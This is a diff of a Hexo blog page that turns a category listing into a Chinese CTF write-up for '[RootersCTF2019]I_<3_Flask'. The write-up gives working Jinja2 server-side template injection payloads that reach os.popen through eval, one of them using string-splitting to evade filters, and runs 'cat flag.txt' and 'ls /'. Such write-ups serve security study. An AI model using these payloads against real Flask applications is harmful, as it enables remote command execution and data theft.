@@ -24,12 +24,16 @@
 <link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
   
-
-<link rel="canonical" href="http://odiws.github.io/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">
-
+  <meta name="keywords" content="buuctf" />
 
 
-  <title>Category: 刷题笔记 | Yume Shoka = Hexo</title>
+<link rel="canonical" href="http://odiws.github.io/2024/06/06/[RootersCTF2019]I_3_Flask/">
+
+
+
+  <title>
+'[RootersCTF2019]I_<3_Flask' - ssti - 刷题笔记 |
+Yume Shoka = Hexo</title>
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
   <div id="loading">
@@ -56,9 +60,19 @@
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">
-    Posted in category "刷题笔记"
+  <h1 itemprop="name headline">'[RootersCTF2019]I_<3_Flask'
   </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2024-06-06 19:43:07">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-06-06T19:43:07+08:00">2024-06-06</time>
+  </span>
+</div>
+
 
           </div>
         </div>
@@ -88,12 +102,12 @@
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipesx5fdwj20zk0m81kx.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeuibk9fj20zk0m8ay2.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexj2jgzj20zk0m8b09.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexoj0moj20zk0m8kgu.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevuctzzj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhnx9glj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipew28b65j20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfb3vzhj20zk0m8wny.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicliierfjj20zk0m8npd.jpg"></li>
         </ul>
       </div>
     </header>
@@ -114,77 +128,163 @@
       <div class="inner">
         <div id="main" class="pjax">
           
-  <div class="collapse wrap">
-    <h2 class="item header">
-      <a href="/categories">All</a>
-      <small>/</small>
-      刷题笔记
-      <small>Category</small>
-    </h2>
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="In 刷题笔记"><span itemprop="name">刷题笔记</span></a>
+<meta itemprop="position" content="1" /></span>
+<i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/ssti/" itemprop="item" rel="index" title="In ssti"><span itemprop="name">ssti</span></a>
+<meta itemprop="position" content="2" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2024/06/06/[RootersCTF2019]I_3_Flask/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="odiws">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="rootersctf2019i_️_flask"><a class="markdownIt-Anchor" href="#rootersctf2019i_️_flask">#</a> [RootersCTF2019]I_❤️_Flask</h2>
+<p><img data-src="../images/%5BRootersCTF2019%5DI_3_Flask/1.png" alt="1"></p>
+<p>arjun 工具用于</p>
+<p><img data-src="../images/%5BRootersCTF2019%5DI_3_Flask/2.png" alt="2"></p>
+<p>这题没有过滤，直接用常规的注入语句即可</p>
+<pre><code>?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag.txt').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
+<p>拿到 flag<br>
+<img data-src="../images/%5BRootersCTF2019%5DI_3_Flask/3.png" alt="3"></p>
+<p>在该文件同地址的模板是这样的：</p>
+<p>但是如果是根目录就是：</p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
+    &#123;% if 'eva'+'l' in b.keys() %&#125;
+      &#123;&#123; b['eva'+'l']('__impor'+'t__'+'("o'+'s")'+'.pope'+'n'+'("ls /").read()') &#125;&#125;
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+</code></pre>
+<p>还可以：</p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
+<p>还可以用 fenjing 直接秒了：</p>
+<p>使用方法博客上有：</p>
+<p>直接秒了</p>
+<p><img data-src="../images/%5BRootersCTF2019%5DI_3_Flask/4.png" alt="4"></p>
+
+      <div class="tags">
+          <a href="/tags/buuctf/" rel="tag"><i class="ic i-tag"></i> buuctf</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2024-06-08 20:22:47" itemprop="dateModified" datetime="2024-06-08T20:22:47+08:00">2024-06-08</time>
+  </span>
+</div>
+
       
-      <article class="item normal" itemscope itemtype="http://schema.org/Article">
-        <div class="meta">
-          <time itemprop="dateCreated"
-                datetime="2024-09-23T15:32:41+08:00"
-                content="2024-09-23">
-            09-23
-          </time>
-        </div>
-        <div class="title">
-            <a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" itemprop="url">
-              <span itemprop="name">[安洵杯2019]iamthinking</span>
-            </a>
-        </div>
-      </article>
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
       
-      <article class="item normal" itemscope itemtype="http://schema.org/Article">
-        <div class="meta">
-          <time itemprop="dateCreated"
-                datetime="2024-06-06T21:19:01+08:00"
-                content="2024-06-06">
-            06-06
-          </time>
-        </div>
-        <div class="title">
-            <a href="/2024/06/06/%5BNCTF2019%5DSQLi/" itemprop="url">
-              <span itemprop="name">'[NCTF2019]SQLi'</span>
-            </a>
-        </div>
-      </article>
-              (1)
-        <h3 class="item section">
-          <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/ssti/">ssti</a><small></small>
-        </h3>
+      <div>
+        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
       
-      <article class="item normal" itemscope itemtype="http://schema.org/Article">
-        <div class="meta">
-          <time itemprop="dateCreated"
-                datetime="2024-06-06T19:43:07+08:00"
-                content="2024-06-06">
-            06-06
-          </time>
-        </div>
-        <div class="title">
-            <a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" itemprop="url">
-              <span itemprop="name">'[RootersCTF2019]I_<3_Flask'</span>
-            </a>
-        </div>
-      </article>
+      <div>
+        <img data-src="/images/alipay.png" alt="odiws Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="odiws PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://odiws.github.io/2024/06/06/[RootersCTF2019]I_3_Flask/" title="&#39;[RootersCTF2019]I_&lt;3_Flask&#39;">http://odiws.github.io/2024/06/06/[RootersCTF2019]I_3_Flask/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
   </div>
   
+
+<div class="post-nav">
+    <div class="item left">
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2024/06/06/%5BNCTF2019%5DSQLi/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciuja1j1j20zk0m8kjl.jpg" title="&#39;[NCTF2019]SQLi&#39;">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
+  <h3>'[NCTF2019]SQLi'</h3>
+  </a>
+
+    </div>
+</div>
+
   
+  <div class="wrap" id="comments"></div>
 
 
         </div>
         <div id="sidebar">
           
+
 <div class="inner">
 
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#rootersctf2019i_%EF%B8%8F_flask"><span class="toc-number">1.</span> <span class="toc-text"> [RootersCTF2019]I_❤️_Flask</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li class="active"><a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" rel="bookmark" title="'[RootersCTF2019]I_<3_Flask'">'[RootersCTF2019]I_<3_Flask'</a></li>
+        </ul>
       </div>
       <div class="overview panel" data-title="Overview">
         <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -243,6 +343,7 @@
   </ul>
 </div>
 
+
         </div>
         <div class="dimmer"></div>
       </div>
@@ -258,20 +359,20 @@
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/misc/" title="In misc">misc</a>
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/11/04/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/" title="zip伪加密">zip伪加密</a></span>
+    <span><a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" title="[安洵杯2019]iamthinking">[安洵杯2019]iamthinking</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+<a href="/categories/misc/" title="In misc">misc</a>
 </div>
 
-    <span><a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" title="[安洵杯2019]iamthinking">[安洵杯2019]iamthinking</a></span>
+    <span><a href="/2024/11/04/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/" title="zip伪加密">zip伪加密</a></span>
   </li>
 
       
@@ -324,7 +425,7 @@
   </div>
 <script data-config type="text/javascript">
   var LOCAL = {
-    path: 'categories/刷题笔记/',
+    path: '2024/06/06/[RootersCTF2019]I_3_Flask/',
     favicon: {
       show: "（●´3｀●）Goooood",
       hide: "(´Д｀)Booooom"
